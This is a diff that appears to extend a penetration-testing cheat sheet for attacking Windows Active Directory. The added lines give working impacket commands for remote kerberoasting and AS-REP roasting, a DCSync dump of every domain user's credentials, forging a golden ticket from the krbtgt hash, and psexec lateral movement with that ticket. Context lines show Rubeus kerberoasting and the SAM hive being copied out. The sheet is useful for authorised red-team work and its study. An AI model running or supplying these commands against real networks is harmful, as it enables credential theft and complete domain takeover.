@@ -799,6 +799,38 @@ copy C:\users\public\S*M X:\dump\
 .\Rubeus.exe kerberoast /outfile:hash.txt
 ```
 
+### ASREP and kerberoast from remote
+```bash
+# Kerberoasting
+GetUserSPNs.py -dc-ip DC_IP -request FQDN/USER:PW
+# ASREP roast, pick the format as hashcat or john
+GetNPUsers.py DOMAIN_NAME/DOMAIN_USERNAME:PASSWORD -request -format [hashcat|john] -outputfile FILE_NAME
+```
+
+### DC sync hashes dump
+If you find out someone has a DC sync right through bloodhound
+or you obtained Domain Administrator access. Run a DC sync to get all
+stored domain user creds.
+```bash
+secretsdump.py FQDN/USER:PW@DC_IP # may add -just-dc and -just-dc-ntlm according to the need
+```
+
+### Get access with ticket
+After getting the hashes, if most hashes are unusable and the krbtgt one is available.
+You can try generating a golden ticket with its NTLM hash. But will need to enumerate for extra info.
+```powershell
+Get-ADDomain DOMAIN_NAME # This to get the domain sid
+```
+Then perform the ticket attack with enumerated info
+```bash
+ticketer.py -nthash KRBTGT_NTLM_HASH -domain-sid DOMAIN_SID -domain FQDN DOMAIN_USER
+```
+After getting the ticket, export the TGT for impacket tool
+```bash
+export KRB5CCNAME=TGT_FILENAME
+psexec.py  DOMAIN_NAME/DOMAIN_USER@TARGET_HOST -k -no-pass # Not necessary to be psexec, can use smbexec or any other similar tools.
+```
+
 ### Cracking harvested hashes
 Mscache v2 hashes cracking:
 
